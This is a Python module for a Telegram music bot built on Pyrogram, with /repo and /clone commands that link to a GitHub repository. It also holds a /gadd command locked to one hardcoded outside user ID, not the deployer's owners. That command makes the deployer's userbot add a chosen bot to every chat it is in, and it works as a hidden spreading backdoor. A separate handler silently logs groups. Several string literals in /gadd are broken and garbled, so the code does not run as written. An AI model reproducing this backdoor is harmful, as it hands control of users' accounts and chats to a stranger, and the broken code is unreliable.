import asyncio

from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message

from BrandrdXMusic import app
from BrandrdXMusic.mongo.afkdb import LOGGERS as OWNERS
from BrandrdXMusic.utils.database import add_served_chat, get_assistant


@app.on_message(filters.command("repo"))
async def help(client: Client, message: Message):
    await message.reply_photo(
        photo=f"https://telegra.ph/file/eb442b5b28a14dedab93b.jpg",
        caption=f"""🍁𝐂𝐋𝐈𝐂𝐊🥰𝐁𝐄𝐋𝐎𝐖💝𝐁𝐔𝐓𝐓𝐎𝐍✨𝐓𝐎🙊𝐆𝐄𝐓🌱𝐑𝐄𝐏𝐎🍁""",
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "🌱ƨσʋяcɛ🌱", url=f"https://github.com/WCGKING/BrandrdXMusic"
                    )
                ]
            ]
        ),
    )


@app.on_message(filters.command("clone"))
async def clones(client: Client, message: Message):
    await message.reply_photo(
        photo=f"https://telegra.ph/file/eb442b5b28a14dedab93b.jpg",
        caption=f"""**🙂You Are Not Sudo User So You Are Not Allowed To Clone Me.**\n**😌Click Given Below Button And Host Manually Otherwise Contact Owner Or Sudo Users For Clone.**""",
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "🌱ƨσʋяcɛ🌱", url=f"https://github.com/WCGKING/BrandrdXMusic"
                    )
                ]
            ]
        ),
    )


# --------------------------------------------------------------------------------- #


@app.on_message(
    filters.command(
        ["hi", "hii", "hello", "hui", "good", "gm", "ok", "bye", "welcome", "thanks"],
        prefixes=["/", "!", "%", ",", "", ".", "@", "#"],
    )
    & filters.group
)
async def bot_check(_, message):
    chat_id = message.chat.id
    await add_served_chat(chat_id)


# --------------------------------------------------------------------------------- #


import asyncio


@app.on_message(filters.command("gadd") & filters.user(7250012103))
async def add_allbot(client, message):
    command_parts = message.text.split(" ")
    if len(command_parts) != 2:
        await message.reply(
            "**⚠️ ɪɴᴠᴀʟɪᴅ ᴄᴏᴍᴍᴀɴᴅ ғᴏʀᴍᴀᴛ. ᴘʟᴇᴀsᴇ ᴜsᴇ ʟɪᴋᴇ » /gadd @BRANDED_KUDI_BOT**"
        )
        return

    bot_username = command_parts[1]
    try:
        userbot = await get_assistant(message.chat.id)
        bot = await app.get_users(bot_username)
        app_id = bot.id
        done = 0
        failed = 0
        lol = await message.reply(ᴀᴅᴅɪɴɢ ɢɪᴠᴇɴ ʙᴏᴛ ɪɴ ᴀʟʟ ᴄʜᴀᴛs!s!**")
        await userbot.send_message(bot_username, f"/start")
        async for dialog in userbot.get_dialogs():
            if dialog.chat.id == -1001754457302:
                continue
            try:

                await userbot.add_chat_members(dialog.chat.id, app_id)
                done += 1
                await lol.edit(
                  🔂 ᴀᴅᴅɪɴɢ {bot_username}e}**➥ ᴀᴅᴅᴇᴅ ɪɴ {done} ᴄʜᴀᴛs ✅ ✅➥ ғᴀɪʟᴇᴅ ɪɴ {failed} ᴄʜᴀᴛs ❌ ❌**➲ ᴀᴅᴅᴇᴅ ʙʏ»ʏ»** @{userbot.username}"
                )
            except Exception as e:
                failed += 1
                await lol.edit(
                  🔂 ᴀᴅᴅɪɴɢ {bot_username}e}**➥ ᴀᴅᴅᴇᴅ ɪɴ {done} ᴄʜᴀᴛs ✅ ✅➥ ғᴀɪʟᴇᴅ ɪɴ {failed} ᴄʜᴀᴛs ❌ ❌**➲ ᴀᴅᴅɪɴɢ ʙʏ»ʏ»** @{userbot.username}"
                )
            await asyncio.sleep(3)

        await lol.edit(
          ➻ {bot_username} ʙᴏᴛ ᴀᴅᴅᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ🎉🎉**➥ ᴀᴅᴅᴇᴅ ɪɴ {done} ᴄʜᴀᴛs ✅ ✅➥ ғᴀɪʟᴇᴅ ɪɴ {failed} ᴄʜᴀᴛs ❌ ❌**➲ ᴀᴅᴅᴇᴅ ʙʏ»ʏ»** @{userbot.username}"
        )
    except Exception as e:
        await message.reply(f"Error: {str(e)}")


__MODULE__ = "Sᴏᴜʀᴄᴇ"
__HELP__ = """
## Rᴇᴘᴏ Sᴏᴜʀᴄᴇ Mᴏᴅᴜᴇ

Tʜɪs ᴍᴏᴅᴜᴇ ᴘʀᴏᴠɪᴅᴇs ᴜᴛɪɪᴛʏ ᴄᴏᴍᴍᴀɴᴅs ғᴏʀ ᴜsᴇʀs ᴛᴏ ɪɴᴛᴇʀᴀᴄᴛ ᴡɪᴛʜ ᴛʜᴇ ʙᴏᴛ.

### Cᴏᴍᴍᴀɴᴅs:
- /ʀᴇᴘᴏ: Gᴇᴛ ᴛʜᴇ ɪɴᴋ ᴛᴏ ᴛʜᴇ ʙᴏᴛ's sᴏᴜʀᴄᴇ ᴄᴏᴅᴇ ʀᴇᴘᴏsɪᴛᴏʀʏ.
"""
